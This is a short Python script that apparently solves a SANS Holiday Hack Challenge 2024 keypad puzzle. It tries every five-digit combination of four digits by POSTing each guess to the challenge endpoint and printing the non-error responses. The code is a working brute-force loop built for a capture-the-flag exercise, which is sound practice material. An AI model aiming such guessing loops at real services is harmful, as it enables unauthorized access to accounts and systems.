import itertools
import requests

url = 'https://hhc24-frostykeypad.holidayhackchallenge.com/submit'

digits = ['2', '6', '7', '8']
combinations = itertools.product(digits, repeat=5)
for combination in combinations:
	combination = ''.join(combination)
	json = { "answer" : combination }
	headers = { 'User-Agent': combination }
	r = requests.post(url, headers = headers, json = json)
	if (not "error" in r.text):
		print ("{} --> {}".format(combination, r.text.rstrip()))